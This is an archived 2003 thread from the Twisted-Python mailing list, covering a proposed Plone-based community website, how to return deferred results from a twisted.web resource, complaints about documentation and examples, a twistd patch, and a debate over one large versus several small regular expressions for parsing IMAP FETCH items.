Date: 09 Jul 2003 21:55:05 +0200
Subject: [Twisted-Python] New TwistedMatrix WebSite - wainting for
	comments
In-Reply-To: <7AB54D92-B243-11D7-8509-000A27AF313A@mindspring.com>
References: <7AB54D92-B243-11D7-8509-000A27AF313A@mindspring.com>
Message-ID: <1057780505.2860.82.camel@biproc>

On Wed, 2003-07-09 at 21:28, Peter Herndon wrote:
> Philippe,
> 
> > Yes, Plone is an Add on for Zope CMF. Maybe in the future some parts 
> > of the site would
> > use twisted products (still to define).
> 
> Why do you believe we need the content management features of Plone?  
> What is your rationale?  And, perhaps more to the point, perhaps you 
> should consider rewriting the functionality using Twisted, if you deem 
> the features necessary.  After all, the Twisted website is the premier 
> working advertisement for the Twisted code, at least at the moment.  If 
> we don't eat our own dogfood, that will reflect very poorly on Twisted.

That's why I putted the logo twisted powered in footer. I'd love to see
some apps running on such website.


> Please understand, I am not trying to belittle Twisted in any way, but 
> the website is the one working example of Twisted that I know about.  
> In all the other cases listed under "Success Stories", Twisted is being 
> used in its role as framework-under-the-covers, and is not on public 
> display.  Having a public-accessible example of Twisted allows the 
> potential user to "kick the tires" before buying.

There's no -- known -- success story about twisted. I saw Issues, but
it's maybe the only plugin / product / app which is not deprecated.

You shouldn't forget that Twisted has not only developers, but USERS too
! The current website and mailing are designed for developers, not users
(which is a good starting point btw).

> Reinventing the wheel that is Plone is by no means a trivial task, yet 
> I believe that moving to a solution that is not powered by Twisted 
> would be a very bad move in terms of public relations.  Of course, 
> writing a bridge layer to make Plone run on top of Twisted would be 
> really cool, too.  Insane, maybe, but cool.  ;)

I agree, that would be great. Now, we don't have known products. Making
such a bridge would be too much efforts.

We really need some working exemple, some uptodate apps that show how to
use Twisted.

Plone would help us to set a dynamic community, and that the only point
I see. Twisted.web is not designed to make content management
applications, so please let zope and plone do their job.

> For what it might be worth, I would suggest using Twisted in all areas 
> that you possibly can.  For instance, Twisted has an NNTP server.  So, 
> why aren't we (or are we, I don't know?) mirroring this mailing list as 
> a newsgroup?  Stuff like this provides great advertising opportunities.

Would be a good idea. New users don't use the mailing list just to give
twisted a shot. They are often disappointed by the lack of uptodate docs
and exemples.



(sorry for my english)
Philippe




From lafou at wanadoo.fr  Wed Jul  9 16:00:56 2003
From: lafou at wanadoo.fr (Philippe =?ISO-8859-1?Q?Lafoucri=E8re?=)
Date: 09 Jul 2003 22:00:56 +0200
Subject: [Twisted-Python] New TwistedMatrix WebSite - wainting for
	comments
In-Reply-To: <200307092045.35015.jon@totient.demon.co.uk>
References: <1057769430.2859.64.camel@biproc>
	 <200307092045.35015.jon@totient.demon.co.uk>
Message-ID: <1057780856.2859.89.camel@biproc>

On Wed, 2003-07-09 at 21:45, Jon Dyte wrote:
> Phillippe
> 
> Looks like a good idea.
> what we all want to know, is are you running Zope on top of twisted for this 
> site? Or is this apache/zserver etc etc?
> 
> cheers
> 
> Jon

This website is running on a PIII 750 (256 Mo, 10Go HD). It runs Gentoo Linux 1.4 
with zope 2.6.1. There is a proxy pass on my gateway to this machine (via apache).
Plone needs zope to run. BUT, we can add some features using twisted, I have no exemple
at all for now. Maybe a forum, the log of the mailing list, a newsletter, whatever, something 
original.

This site has been designed to replace twisted, but to complement (or complete, I don't know
which is the correct term) it.

I love the idea of plone because every user can add some content, and maybe start some new
twisted projects. I repeat : this site should be designed for users, not only "twisted-core" 
developers.


Philippe




From don at motorola.com  Wed Jul  9 16:17:53 2003
From: don at motorola.com (Don Hiatt)
Date: Wed, 9 Jul 2003 15:17:53 -0500
Subject: [Twisted-Python] using defferred?
In-Reply-To: <1057776616.2860.66.camel@biproc>
Message-ID: <FPEBLIAFGDEEOHHAGOKBKEADCCAA.don@motorola.com>

Howdy,

So I have a simple client that connects to "A" and sends
a requests and waits for a response. I'm using the clientfactory
and it works great. Now, I would like to integrate it with
a webserver, so when the user requests a certain url, I will
have my client connects to "A", send the request, wait for
the response, and then render the result in html and pass it
back to the user. The problem is, how do you do this in a 
event based system? I suspect Defferred might be my friend but 
I'm not sure.

My app looks like

class Simple(resource.Resource):
	isLeaf = True
	def render(self, request):
		sendRequest()
		... How do I wait for the client's datarecieved method
		.... to be called and then have access to the data??
		return result

....
__main__
m = Factory()
app.connect(h,p,m)

site = server.Site(Simple())
app.listenTCP(8888, site)


Thanks a lot for your time.

Cheers,

don




From mario at ruggier.org  Wed Jul  9 18:31:56 2003
From: mario at ruggier.org (Mario Ruggier)
Date: Thu, 10 Jul 2003 00:31:56 +0200
Subject: [Twisted-Python] using defferred?
In-Reply-To: <FPEBLIAFGDEEOHHAGOKBKEADCCAA.don@motorola.com>
Message-ID: <2593EDB2-B25D-11D7-9E80-000393756786@ruggier.org>

I had asked a similar question some time ago--this should surely
be added to the FAQ? (I see it is "mentioned" in the using-twistedweb
howto, but not really explained...)

Here's one way to do it (as I understand it), morphing your
example code to illustrate:

##

from twisted.internet import defer, threads
from twisted.web.server import NOT_DONE_YET

def callbackResult(result, request):
     request.write(result)
     request.finish()

class Simple(resource.Resource):
     isLeaf = True
     def render(self, request):
         d = threads.deferToThread(sendRequest)
         d.addCallback(callbackResult, request)
         return NOT_DONE_YET
...

##

Another way to do it could be to use the woven MVC, in
particular to use the IModel interface. Anyone can provide
a simple example for that?

mario



On mercredi, juil 9, 2003, at 22:17 Europe/Amsterdam, Don Hiatt wrote:

> Howdy,
>
> So I have a simple client that connects to "A" and sends
> a requests and waits for a response. I'm using the clientfactory
> and it works great. Now, I would like to integrate it with
> a webserver, so when the user requests a certain url, I will
> have my client connects to "A", send the request, wait for
> the response, and then render the result in html and pass it
> back to the user. The problem is, how do you do this in a
> event based system? I suspect Defferred might be my friend but
> I'm not sure.
>
> My app looks like
>
> class Simple(resource.Resource):
> 	isLeaf = True
> 	def render(self, request):
> 		sendRequest()
> 		... How do I wait for the client's datarecieved method
> 		.... to be called and then have access to the data??
> 		return result
>
> ....
> __main__
> m = Factory()
> app.connect(h,p,m)
>
> site = server.Site(Simple())
> app.listenTCP(8888, site)
>
>
> Thanks a lot for your time.
>
> Cheers,
>
> don
>
>
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python




From 2002 at weholt.org  Wed Jul  9 20:02:47 2003
From: 2002 at weholt.org (Thomas Weholt)
Date: Thu, 10 Jul 2003 02:02:47 +0200
Subject: [Twisted-Python] Is it just me ....
Message-ID: <006f01c34676$9a28db80$0401a8c0@razor>

or is Twisted ... well, complicated. I've been programming for several years
and I don't consider myself to be dumb, allthough not a genius either ;-) --
but Twisted is hard to understand. Perhaps you guys find the docs simple
enough, but I just don't get a lot of the key concepts.

The fact that there are so few examples of running ( and uptodate as
mentioned by P. Lafoucriere ) apps available might be a clue. Just look at
the whole RPYs-thing we had going some time ago. Web-development, or to be
precise, running a full-scale webserver is why a lot of people look into
Twisted in the first place. The lack of example-apps and obvious
misunderstandings on how Twisted is meant to be used is what's holding
Twisted back, IMHO.

I really hope the new Twisted-community page can bring some simple, well
documented examples on how to do things. By the way things are going we'll
probably have very good docs in a couple of months or so, but I want to
implement a feature-rich webserver based on Twisted now, as I've described
and nagged about in my postings on this list several times.

Anyway, I feel there is too much promise in the Twisted platform to let a
few good examples scare alot of potential users away. I'm still working on a
test-implementation of a webserver which hopefully will be easy enough to
understand and deploy, extend and customize, written in a Twisted-way.

Anyway, I'm going to ask again; any example, small and simple, showing how
to implement a webserver serving static content *and* dynamic pages, not
static pages like Issues or Bannerfish, using woven-forms and
user-authentication, in a Twisted-compatible manner would be appreciated. If
I'm the only one feeling this way, I'll shut up, dive into the docs again,
try some more and keep silent while doing so. Hopefully I'll be able to
learn Twisted and contribute something, not just nag, to a dedicated group
of developers.

Now, I have to go get 3-4 hours of sleep before going to work. Thank your
for your interest.

PS! An early version of my test-web-server is still available at
http://home.online.no/~t-weh/articles/projects/elope/elopetestimplementation
.zip and I'm still hoping for comments.

Best regards,
Thomas W




From golux at comcast.net  Wed Jul  9 23:22:19 2003
From: golux at comcast.net (Steve Waterbury)
Date: Wed, 09 Jul 2003 23:22:19 -0400
Subject: [Twisted-Python] a patch to add an option to twistd to run without signal handlers
Message-ID: <3F0CDBEB.30804@comcast.net>

Minions,

Whereas my machine has acquired a weird malady that causes a
traceback when trying to run the reactor with signal
handlers (I've tried many things, including compiling
various versions of Python from source, etc. ... I'm sure
it will be revealed one of these days what the hell is
going on, but in the meantime ...), and whereas I can
run my tests using reactor.run(installSignalHandlers=0)
but I also like to test using twistd and a tap file,
I made this relatively innocent little hack to give twistd
an option that make it more convenient to do so.

Of course, when twistd is killed running in this mode it
dies very unceremoniously, not signing off in its log
or removing its pid file or writing anything.  But it does
what I need.

Offered for your consideration ...

Cheers,
Steve.
-------------- next part --------------
An embedded and charset-unspecified text was scrubbed...
Name: patch-twistd-nosig
Url: http://twistedmatrix.com/pipermail/twisted-python/attachments/20030709/6a6fc564/attachment.txt 

From ta-meyer at ihug.co.nz  Wed Jul  9 23:27:15 2003
From: ta-meyer at ihug.co.nz (Tony Meyer)
Date: Thu, 10 Jul 2003 15:27:15 +1200
Subject: [Twisted-Python] Re: IMAP fixes
In-Reply-To: <1ED4ECF91CDED24C8D012BCF2B034F13025654DC@its-xchg4.massey.ac.nz>
Message-ID: <1ED4ECF91CDED24C8D012BCF2B034F130212AAE7@its-xchg4.massey.ac.nz>

>   Eeep :o  This isn't quite what I was going for... The exec
> stage is a big no-no from my point of view.

Fair enough.

> I guess I should give a couple examples.

That helped!

>   The only other thing I wanted to mention was that scary
> regular expression.  I haven't even attempted to decipher it 
> yet, but I was curious if you pulled it out of or based it 
> off of one of the RFCs, or if you came up with it yourself?  

I built it myself from RFC2060, using Kodos (and my server) to test it.

> In my experience expressions that long tend to be wrong in
> unexpected and surprising ways, and I'm not inclined to trust 
> them without careful analysis, or at least the knowledge that 
> they come from an authoritative source (and even then, 
> ensuring the proper meaning survived into the translation to 
> python REs is a pain...)

Well, it started life as a python RE, so there was no translation.  I did
very carefully analyse (and test) it, and you're welcome to as well.  It's
easy enough to do without it, or split it into several smaller re's, but
this seems the best way to do it.

It's really not as complicated as it looks - a lot of the length comes from
having named groups, which makes things more reliable, not less.  There are
also several uncaptured groups, which could probably just be made into
regular groups, but the result is tidier this way.

I've made the re verbose, so maybe that helps?  (the changes also allowed it
to be simplified just a little, plus I've made it more for capturing and
less for checking, in the mime section specifier, particularly).

>   All that said, thanks for the patch!  I'm looking forward
> to the next revision :)

Here it is.  The atts passed should be more-or-less what you described, now.

The mailbox code isn't quite the same; you had (as an example):
>     def fetch(self, msgs, queryParts, uid):
>         r = {}
>         for q in queryParts:
>             r[q] = getattr(self, 'fetch_' + q.name)(msgs, q, uid)

But this seems strange to me - you end up with a dictionary where the keys
are the classes (Body(), UID(), etc).  Whatever the values end up being,
unless the message id is added to the class, then this really doesn't fit
with the existing __cbFetch at all, which wants the keys to be the message
ids (which makes sense to me).  My mailbox code looks like this:
    def fetch(self, msgs, queryParts, uid):
        r = {}
        for (id, msg) in self.messagesIter(msgs, uid):
            r[id] = {}
            for q in parts:
                r[id][q] = getattr(self, 'grab' + q.name.upper())(msg, q)
        return r
Which is pretty similar, except that the key is still the message id.  (I
also do it message by message, whereas yours was part by part, but that
shouldn't matter).

It also wasn't exactly clear how you wanted the values to be returned.  What
is does at the moment is pass back a dict where the values are dicts of
class (BODY(), UID(), etc) to string.  This seems to be pretty close to the
original.

Let me know what you think of this, and I'll keep on with the fixes...

=Tony Meyer
-------------- next part --------------
An embedded and charset-unspecified text was scrubbed...
Name: fetch_att.py
Url: http://twistedmatrix.com/pipermail/twisted-python/attachments/20030710/5f4ce7b4/attachment.txt 

From m at moshez.org  Thu Jul 10 01:53:39 2003
From: m at moshez.org (Moshe Zadka)
Date: 10 Jul 2003 05:53:39 -0000
Subject: [Twisted-Python] Re: IMAP fixes
In-Reply-To: <1ED4ECF91CDED24C8D012BCF2B034F130212AAE7@its-xchg4.massey.ac.nz>
References: <1ED4ECF91CDED24C8D012BCF2B034F130212AAE7@its-xchg4.massey.ac.nz>
Message-ID: <20030710055339.31218.qmail@green.zadka.com>

On Thu, 10 Jul 2003, "Tony Meyer" <ta-meyer at ihug.co.nz> wrote:

> Well, it started life as a python RE, so there was no translation.  I did
> did very carefully analyse (and test) it, and you're welcome to as well.
> It's easy enough to do without it, or split it into several smaller re's, but
> this seems the best way to do it.

Why?
It's much better to split into several REs. When you need to comment your
REs, they're obviously useless -- it is impossible to keep comments in sync
with code, so when bugs crop up in your RE, it will be difficult to fix.
Not to mention you can't step with PDB through REs, or insert prints, to
see what exactly is going wrong.

Here's a proof of concept (untested) factorization into several REs
each of which is easy enough to describe:

sectionRe = re.compile('([\d\.])*\.') # digits and dots, ends with dot
partRe = re.compile('([A-Z\.]+)') # upper case letters and dots
fielditemsRe = re.compile(' \([()])*\)') # open-paren, parens, close paren
partialRe = re.compile('<(\d+\.[1-9]\d*)>') # digits, dot, non-zero, digits
body = re.compile('BODY') # BODY
peek = re.compile('\.?PEEK') # optional dot, PEEK
bra = re.compile('\[') # literal [
cket = re.compile('\]') # literal ]

# The comments are not necessary -- my point is that looking at those
# REs is easy to understand what they capture

def trymatch(r, s):
    m = r.match(s)
    if m:
        return m.group(1), s[m.end():]
    else:
        return None, s

def forcematch(r, s)
    m = r.match(s)
    if not m:
        raise IllegalIdentiferError()
    return s[m.end():]

# Note how the parsing is now done with code -- only the low-level
# tokenizing is done with REs. The code is relatively easy to read.
def parse(s):
    s = forcematch(body, s)
    peek, s = trymatch(peek, s)
    s = forcematch(bra, s)
    section, s = trymatch(sectionRe, s)
    part, s = trymatch(partRe, s, 1)
    fielditems, s = trymatch(fielditemsRe, s)
    s = forcematch(cket, s, 1)
    partial, s = trymatch(partialRe, s, 1)
    # End when you write it like that, it is easy to fine
    # false positives. For example, should we check s is empty?
    return peek, section, part, fielditems, partial

-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From itamar at itamarst.org  Thu Jul 10 01:51:39 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Thu, 10 Jul 2003 01:51:39 -0400
Subject: [Twisted-Python] a patch to add an option to twistd to run
 without signal handlers
In-Reply-To: <3F0CDBEB.30804@comcast.net>
References: <3F0CDBEB.30804@comcast.net>
Message-ID: <20030710015139.3b4b1447.itamar@itamarst.org>

On Wed, 09 Jul 2003 23:22:19 -0400
Steve Waterbury <golux at comcast.net> wrote:

> Whereas my machine has acquired a weird malady that causes a
> traceback when trying to run the reactor with signal
> handlers (I've tried many things, including compiling
> various versions of Python from source, etc. ... I'm sure

Apparently this is a bug in wxPython 2.4.1.2. See the wxpython bug
tracker. Unless you discovered a whole new bug :)



From golux at comcast.net  Thu Jul 10 02:25:05 2003
From: golux at comcast.net (Steve Waterbury)
Date: Thu, 10 Jul 2003 02:25:05 -0400
Subject: [Twisted-Python] a patch to add an option to twistd to run without
 signal handlers
In-Reply-To: <20030710015139.3b4b1447.itamar@itamarst.org>
References: <3F0CDBEB.30804@comcast.net> <20030710015139.3b4b1447.itamar@itamarst.org>
Message-ID: <3F0D06C1.2090801@comcast.net>

Itamar Shtull-Trauring wrote:
> On Wed, 09 Jul 2003 23:22:19 -0400
> Steve Waterbury <golux at comcast.net> wrote:
> 
>>Whereas my machine has acquired a weird malady that causes a
>>traceback when trying to run the reactor with signal
>>handlers (I've tried many things, including compiling
>>various versions of Python from source, etc. ... I'm sure
> 
> Apparently this is a bug in wxPython 2.4.1.2. See the wxpython bug
> tracker. ...

Yep, that's exactly the bug.  It affects my code only in
some of the modules shared between client and server
packages, in which wx is imported ....  Hopefully
a point release of wx will come out soon to fix this,
as we want to run the reactor in our client also.

That twistd --nosig patch is mostly for situations that
shouldn't happen, I expect ... but if they do, there it is.
;^)

Steve.




From lafou at wanadoo.fr  Thu Jul 10 02:39:46 2003
From: lafou at wanadoo.fr (Philippe =?ISO-8859-1?Q?Lafoucri=E8re?=)
Date: 10 Jul 2003 08:39:46 +0200
Subject: [Twisted-Python] Is it just me ....
In-Reply-To: <006f01c34676$9a28db80$0401a8c0@razor>
References: <006f01c34676$9a28db80$0401a8c0@razor>
Message-ID: <1057819186.22678.2.camel@biproc>

On Thu, 2003-07-10 at 02:02, Thomas Weholt wrote:
> or is Twisted ... well, complicated. I've been programming for several years
> and I don't consider myself to be dumb, allthough not a genius either ;-) --
> but Twisted is hard to understand. Perhaps you guys find the docs simple
> enough, but I just don't get a lot of the key concepts.
> 
> The fact that there are so few examples of running ( and uptodate as
> mentioned by P. Lafoucriere ) apps available might be a clue. Just look at
> the whole RPYs-thing we had going some time ago. Web-development, or to be
> precise, running a full-scale webserver is why a lot of people look into
> Twisted in the first place. The lack of example-apps and obvious
> misunderstandings on how Twisted is meant to be used is what's holding
> Twisted back, IMHO.


Needless to say, I agree with you.




From ta-meyer at ihug.co.nz  Thu Jul 10 02:59:42 2003
From: ta-meyer at ihug.co.nz (Tony Meyer)
Date: Thu, 10 Jul 2003 18:59:42 +1200
Subject: [Twisted-Python] Re: IMAP fixes
In-Reply-To: <1ED4ECF91CDED24C8D012BCF2B034F130256567F@its-xchg4.massey.ac.nz>
Message-ID: <1ED4ECF91CDED24C8D012BCF2B034F1318CF0D@its-xchg4.massey.ac.nz>

> Why?

Well, efficiency, for one.  timeit rates the single re 5-6 times faster than
the proof of concept that you posted (corrected to work).  That's a
considerable speed difference.

> It's much better to split into several REs. When you need to 
> comment your REs, they're obviously useless

It didn't _need_ to be commented, I did so to point out how simple it
actually was.  This is a bizarre statement.  Does it then follow that if you
need to comment code, it's obviously useless?  Why would the re.VERBOSE flag
even exist if this was the case?

This re really isn't that complex.  If I take out the uncapturing and naming
of groups (which are just to make the code easier to read), and drop the
alternation, like in your proof of concept, it becomes:
BODY\.?(PEEK)?\[(([\d\.]*)\.)?([A-Z\.]+)(
\(([^\(\)]*)\))?\](\<\d+\.[1-9]\d*)\>)?
If this was written out in verbose form, then it would be easily as readable
as the proof of concept.

> -- it is impossible to keep comments in sync with code,

Why?  Change the code, check the comment.  Simple.  How is it any different
than checking that a change you make doesn't effect other parts of the code?

> Not to mention you can't step with PDB through REs, or insert 
> prints, to see what exactly is going wrong.

But there are other tools to test re's.  (In any case, you can insert print
statements, simply by using slices appropriately).

> Here's a proof of concept (untested) factorization into several REs
> each of which is easy enough to describe:
> 
> sectionRe = re.compile('([\d\.])*\.') # digits and dots, ends with dot
[...]
> cket = re.compile('\]') # literal ]

This section is no easier to understand - the only difference is the choice
in separation and wording of comments.

> # And when you write it like that, it is easy to find
> # false positives. For example, should we check s is empty?

You can check whether the single re ends at the end of the string just as
easily; I can't think of any tests that can't be carried out just as easily
with either solution.

> # Note how the parsing is now done with code -- only the low-level
> # tokenizing is done with REs. The code is relatively easy to read.

The code has become relatively more difficult to read, because almost all
the work is done by the re engine.  It's the parsing itself that is
theoretically easier to read.

In addition, having the multiple re's adds additional code that must be
written, tested and maintained.  The single re has the advantage that the
code to do the parsing is contained within the re module, and so is someone
else's problem.  There is only a single re to be sure of, instead of several
lines of code.

For the most part, this is a stylistic choice, not a correct/incorrect one.
The single re has the advantage of speed (important, in this particular
case), and less code to write/maintain.  The multiple re approach makes the
parsing more explicit, and makes changing the re less error-prone (an
unlikely event, in this particular case).

As I indicated, I don't really care whether Jp prefers a single re, multiple
re's like this, or using the string module and more if's; it's up to him
(whether I can be bothered coding the alternatives to offer as a patch is
another question ;).  I still personally believe that the single re is most
appropriate for this case, and given that I can always subclass the version
that gets checked in, it won't make any difference.

=Tony Meyer




From andrew-twisted at puzzling.org  Thu Jul 10 03:19:41 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Thu, 10 Jul 2003 17:19:41 +1000
Subject: [Twisted-Python] Is it just me ....
In-Reply-To: <006f01c34676$9a28db80$0401a8c0@razor>
References: <006f01c34676$9a28db80$0401a8c0@razor>
Message-ID: <20030710071941.GA21625@frobozz>

On Thu, Jul 10, 2003 at 02:02:47AM +0200, Thomas Weholt wrote:
> or is Twisted ... well, complicated. I've been programming for several years
> and I don't consider myself to be dumb, allthough not a genius either ;-) --
> but Twisted is hard to understand. Perhaps you guys find the docs simple
> enough, but I just don't get a lot of the key concepts.

I think Twisted isn't so much complex as large.  It has many pieces, and can
do many things.  Some of those pieces can be complex (e.g. PB or Woven), but
different people use Twisted for a lot of different things.  It's only the
last month or so I've seriously looked a twisted.web; I've found plenty of
use for Twisted in things like implementing simple (and not so simple)
protocols.  In particular, simple multi-protocol support in one process was
a big drawcard for me.  Twisted made that stuff *much* simpler than any of
the alternatives I saw.

> The fact that there are so few examples of running ( and uptodate as
> mentioned by P. Lafoucriere ) apps available might be a clue. Just look at
> the whole RPYs-thing we had going some time ago. Web-development, or to be
> precise, running a full-scale webserver is why a lot of people look into
> Twisted in the first place. The lack of example-apps and obvious
> misunderstandings on how Twisted is meant to be used is what's holding
> Twisted back, IMHO.

This is an interesting point.  Most of the Twisted developers, I think,
didn't come to Twisted for the web stuff, at least not primarily.  Thus the
sudden interest in Twisted purely for its web capabilities has caught the
documentation a little off-guard.  I think people expect to see
documentation a little more geared towards web developers, and instead they
get a bunch of docs that barely mentions web until the sixth chapter.  

Also, Woven has been stable and well-documented for a really short period of
time.  It's not like it's been a year since it stabilised and was
documented and we have nothing to show for it -- rather, it's been perhaps 3
months, and we're just starting to see examples like Issues emerge.

Perhaps the confusion is that to fully use twisted web, you need to
understand:
   - Twisted basics, e.g. Deferreds and reactor.callLater
   - Twisted Web basics, e.g. Resources
   - Woven

But you don't necessarily need full mastery of all that to be productive --
I've seen someone start with the PicturePile tutorial, and extend it to have
captions, nicer layout, and other things without major difficulty.  They
didn't need Deferreds, they didn't need the reactor, and they didn't need to
use twisted.web.resoure.Resource directly, and so they had no problems
building upon the parts of Woven that PicturePile demonstrated.

Let me emphasise that: Twisted is actually pretty good at being modular.  If
you don't need something, you don't need to care about it.  So in a sense,
what we need isn't bigger and better omni-examples that do everything at
once (although they might still be useful) -- we need to help new users
filter out the bits of Twisted they don't need, so they can concentrate on
working with learning a manageable subset of it.

I think the PicturePile tutorial is a great example because of this -- you
can do an awful lot with very little.

So ideally we don't need a "how to use a database in a web page", we should
just need "how to use a database in Twisted" and "how to use deferred
results with Twisted Web".  [I think both of these topics are actually
answered pretty poorly at the moment; I think I can feel another bout of doc
hacking coming on...]

> I really hope the new Twisted-community page can bring some simple, well
> documented examples on how to do things. By the way things are going we'll
> probably have very good docs in a couple of months or so, but I want to
> implement a feature-rich webserver based on Twisted now, as I've described
> and nagged about in my postings on this list several times.

I don't see why we need a new "community" page to achieve this.  We have a
perfectly good mailing-list and website -- if someone has a great example,
we'll gladly use it!

> Anyway, I feel there is too much promise in the Twisted platform to let a
> few good examples scare alot of potential users away. I'm still working on a
> test-implementation of a webserver which hopefully will be easy enough to
> understand and deploy, extend and customize, written in a Twisted-way.

What do you mean by "implementation"?  Have you seen Moshe Zadka's
twisted-web Debian package that's being developed?

> Anyway, I'm going to ask again; any example, small and simple, showing how
> to implement a webserver serving static content *and* dynamic pages, not
> static pages like Issues or Bannerfish, using woven-forms and
> user-authentication, in a Twisted-compatible manner would be appreciated. If
> I'm the only one feeling this way, I'll shut up, dive into the docs again,
> try some more and keep silent while doing so. Hopefully I'll be able to
> learn Twisted and contribute something, not just nag, to a dedicated group
> of developers.

There's no need to shut up -- if you're confused or unsure how to do
something, then ask on the list and/or IRC.  I'd like to think we do a
fairly good job at helping, and conversations on the list can and do lead to
improvements in the docs.

-Andrew.




From andrew-twisted at puzzling.org  Thu Jul 10 03:30:03 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Thu, 10 Jul 2003 17:30:03 +1000
Subject: [Twisted-Python] Re: IMAP fixes
In-Reply-To: <1ED4ECF91CDED24C8D012BCF2B034F1318CF0D@its-xchg4.massey.ac.nz>
References: <1ED4ECF91CDED24C8D012BCF2B034F130256567F@its-xchg4.massey.ac.nz> <1ED4ECF91CDED24C8D012BCF2B034F1318CF0D@its-xchg4.massey.ac.nz>
Message-ID: <20030710073003.GB21625@frobozz>

On Thu, Jul 10, 2003 at 06:59:42PM +1200, Tony Meyer wrote:
> > Why?
> 
> Well, efficiency, for one.  timeit rates the single re 5-6 times faster than
> the proof of concept that you posted (corrected to work).  That's a
> considerable speed difference.

Note that the fact Moshe's splitting was incorrect is a good sign that REs
aren't easily readable and understandable ;)

That said, I'd be happy with either solution provided there's a decent set
of test cases for it -- that way I can be confident that it works without
even needing to read the code...  Of course, it's not up to me. :)

-Andrew.




From nbm at mithrandr.moria.org  Thu Jul 10 04:29:13 2003
From: nbm at mithrandr.moria.org (Neil Blakey-Milner)
Date: Thu, 10 Jul 2003 10:29:13 +0200
Subject: [Twisted-Python] Is it just me ....
In-Reply-To: <006f01c34676$9a28db80$0401a8c0@razor>
References: <006f01c34676$9a28db80$0401a8c0@razor>
Message-ID: <20030710082913.GA92306@mithrandr.moria.org>

On Thu 2003-07-10 (02:02), Thomas Weholt wrote:
> or is Twisted ... well, complicated. I've been programming for several years
> and I don't consider myself to be dumb, allthough not a genius either ;-) --
> but Twisted is hard to understand. Perhaps you guys find the docs simple
> enough, but I just don't get a lot of the key concepts.

Well, taking on the entireity of Twisted is complicated, but getting
things up and running requires very little code.  My main stumbling
block with Twisted is the lack of example doing-something-useful
applications.

I've tried to do my part in writing things like bannergrab, stikiwiki,
and tnntprss, but I really have no idea if they're good examples of how
to write things, so I can't really punt them.

Neil
-- 
Neil Blakey-Milner
nbm at mithrandr.moria.org



From 2002 at weholt.org  Wed Jul  9 05:22:49 2003
From: 2002 at weholt.org (Thomas Weholt ( PRIVAT ))
Date: Wed, 9 Jul 2003 11:22:49 +0200
Subject: [Twisted-Python] Sample for using select/option with t.w.w.form.FormProcessor
References: <OF3DF17A7B.F75AB5E6-ONC1256D5C.004C3C60@uz.tengelmann.de>
Message-ID: <000001c346bd$73caa710$3ba8a8c0@gatsoft.no>

Any example on how to use twisted.web.woven.Formxxx would be nice :-)

Thomas
  ----- Original Message ----- 
  From: mmoellenbeck at plus.de 
  To: twisted-python at twistedmatrix.com 
  Sent: Monday, July 07, 2003 3:57 PM
  Subject: [Twisted-Python] Sample for using select/option with t.w.w.form.FormProcessor



  hi, 

  has anybody an example for using select/option with t.w.w.form.FormProcessor? 

  thanks and regarts

  Martin Moellenbeck 

------------------------------------------------------------------------------

-------------- next part --------------
An HTML attachment was scrubbed...
URL: http://twistedmatrix.com/pipermail/twisted-python/attachments/20030709/e09f2f43/attachment.htm 

From m at moshez.org  Thu Jul 10 05:04:55 2003
From: m at moshez.org (Moshe Zadka)
Date: 10 Jul 2003 09:04:55 -0000
Subject: [Twisted-Python] Is it just me ....
In-Reply-To: <20030710082913.GA92306@mithrandr.moria.org>
References: <20030710082913.GA92306@mithrandr.moria.org>, <006f01c34676$9a28db80$0401a8c0@razor>
Message-ID: <20030710090455.6350.qmail@green.zadka.com>

On Thu, 10 Jul 2003, Neil Blakey-Milner <nbm at mithrandr.moria.org> wrote:

> I've tried to do my part in writing things like bannergrab, stikiwiki,
> and tnntprss, but I really have no idea if they're good examples of how
> to write things, so I can't really punt them.

It's fairly simple to find out: put them up on the web, announce them
here. You will likely get more commentary than you ever wanted and
will possibly lead to better docs [so we can prevent people from
making the same mistakes] and better code [if we find out our interfaces
don't suit the way people actually use stuff]. It would also, if you
actually read comments and act on them, lead to an improvement of
your examples.

-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From 2002 at weholt.org  Thu Jul 10 05:20:54 2003
From: 2002 at weholt.org (Thomas Weholt ( PRIVAT ))
Date: Thu, 10 Jul 2003 11:20:54 +0200
Subject: [Twisted-Python] Is it just me ....
References: <006f01c34676$9a28db80$0401a8c0@razor> <20030710071941.GA21625@frobozz>
Message-ID: <001a01c346c4$90870d10$3ba8a8c0@gatsoft.no>

----- Original Message -----
From: "Andrew Bennetts" <andrew-twisted at puzzling.org>
To: <twisted-python at twistedmatrix.com>
Sent: Thursday, July 10, 2003 9:19 AM
Subject: Re: [Twisted-Python] Is it just me ....


> On Thu, Jul 10, 2003 at 02:02:47AM +0200, Thomas Weholt wrote:
> > or is Twisted ... well, complicated. I've been programming for several
years
> > and I don't consider myself to be dumb, allthough not a genius either
;-) --
> > but Twisted is hard to understand. Perhaps you guys find the docs simple
> > enough, but I just don't get a lot of the key concepts.
>
> I think Twisted isn't so much complex as large.  It has many pieces, and
can
> do many things.  Some of those pieces can be complex (e.g. PB or Woven),
but
> different people use Twisted for a lot of different things.  It's only the
> last month or so I've seriously looked a twisted.web; I've found plenty of
> use for Twisted in things like implementing simple (and not so simple)
> protocols.  In particular, simple multi-protocol support in one process
was
> a big drawcard for me.  Twisted made that stuff *much* simpler than any of
> the alternatives I saw.

Agree. I think resources are pretty easy to understand. Woven/Pages are not,
because there so much more happening that the user don't see. Resources has
a render-method which returns content you can send to the client. Or it
writes content to the client. Easy as pie. Woven on the other hand .... I'll
keep on modding the PicturePile-example and play around with the other
examples.

>
> > The fact that there are so few examples of running ( and uptodate as
> > mentioned by P. Lafoucriere ) apps available might be a clue. Just look
at
> > the whole RPYs-thing we had going some time ago. Web-development, or to
be
> > precise, running a full-scale webserver is why a lot of people look into
> > Twisted in the first place. The lack of example-apps and obvious
> > misunderstandings on how Twisted is meant to be used is what's holding
> > Twisted back, IMHO.
>
> This is an interesting point.  Most of the Twisted developers, I think,
> didn't come to Twisted for the web stuff, at least not primarily.  Thus
the
